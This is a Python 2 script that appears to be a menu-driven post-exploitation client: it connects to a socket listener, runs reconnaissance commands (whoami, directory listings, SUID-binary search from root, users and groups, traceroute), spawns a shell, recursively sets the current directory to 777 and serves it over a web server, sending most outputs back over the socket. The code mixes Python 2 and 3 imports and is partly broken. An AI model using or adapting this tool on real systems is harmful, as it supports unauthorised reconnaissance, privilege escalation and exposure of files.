import socket
import sys
import subprocess
import SimpleHTTPServer
import http.server
import socketserver

TCP_IP = '127.0.0.1'
TCP_PORT = 37337
BUFFER_SIZE = 1024


c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((TCP_IP, TCP_PORT))


def printOptions():             
    print "[1] --> Current Working Directory"
    print "[2] --> Listing of Current Directory"
    print "[3] --> Shell"
    print "[4] --> Find which programs have suid bits set starting from root"
    print "[5] --> Current Logged in User."
    print "[6] --> Where is the HOME directory for the current user?"  
    print "[7] --> Users and groups"
    print "[8] --> Trace route to gateway and beyond!!"
    print "[777] --> Change current directory permissions to 777"
    print "[9] --> Upload current directory to remote server (Run this once you've set permissions)"
    print "[0] --> Exit Program."

# Client functionality allows for various functions
def functionalClient():
    global MESSAGE
    while True:
        print ">>>",
        command = input()
        # Although using the shell=True argument is bad security in a production script, in our case it is very helpful to 
        # execute commands that would not usually work without it.
        if command == 1:
            # This command sends output of "pwd" to console on client end
            print subprocess.check_output("pwd", shell=True)
            # To write to output/variable Popen must be used not subprocess.call which is for files
            # Code on this site really helped finalize this
            # https://www.endpoint.com/blog/2015/01/28/getting-realtime-output-using-python
            process = subprocess.Popen("pwd", shell=True, stdout=subprocess.PIPE)
            stdout = process.communicate()[0]
            # Send stdout to server
            c.send(stdout)
        elif command == 2:
            print subprocess.check_output("ls -alt", shell=True)
            process = subprocess.Popen("ls -alt", shell=True, stdout=subprocess.PIPE)
            stdout = process.communicate()[0]
            # send stdout to server
            c.send(stdout)
        elif command == 3:
            print("Shell access granted...")
            subprocess.call("sh", shell=True)
        # Find which programs have suid bits set
        elif command == 4:
            # This command causes issues for some reason on client side
            # print subprocess.check_output("find / -perm -u=s -type f 2>/dev/null", shell=True)
            process = subprocess.Popen("find / -perm -u=s -type f 2>/dev/null", shell=True, stdout=subprocess.PIPE)
            stdout = process.communicate()[0]
            c.send(stdout)
        elif command == 5:
            print subprocess.check_output("whoami", shell=True)
            process = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE)
            stdout = process.communicate()[0]
            c.send(stdout)
        elif command == 6:
            print subprocess.check_output("echo $HOME", shell=True)
            process = subprocess.Popen("echo $HOME", shell=True, stdout=subprocess.PIPE)
            stdout = process.communicate()[0]
            c.send(stdout)
        elif command == 7:
            print subprocess.check_output("users && groups", shell=True)
            process = subprocess.Popen("users && groups", shell=True, stdout=subprocess.PIPE)
            stdout = process.communicate()[0]
            c.send(stdout)
        elif command == 8:
            # trace route to outside world, if inside enterprise network
            print subprocess.check_output("traceroute 8.8.8.8", shell=True)
            process = subprocess.Popen("traceroute 8.8.8.8", shell=True, stdout=subprocess.PIPE)
            stdout = process.communicate()[0]
            c.send(stdout)
        elif command == 9:
            # AN amazing little command if network has SimpleHTTPServer installed
            # Simply open browser and type in 127.0.0.1
            # This will list your whole current directory
            # Dont need sudo access if network has python suid bit set
            # ALso if they have python they most likely have SimpleHTTPServer as a module
            print "Hosting web server of current directory @ ",TCP_IP,"8000"
            process = subprocess.call(["python2 -m SimpleHTTPServer 8000"], shell=True)
        elif command == 777:
            process = subprocess.call(["chmod -R 777 ./"], shell=True)
            print "Full access to current directory!!! >:)"
            c.send("Full access to current directory!!! >:)")
        elif command == 0:
            print("Exiting...")
            sys.exit()


def main():
    printOptions()
    functionalClient()

main()
data = c.recv(BUFFER_SIZE)
c.close()

print "received data:", data
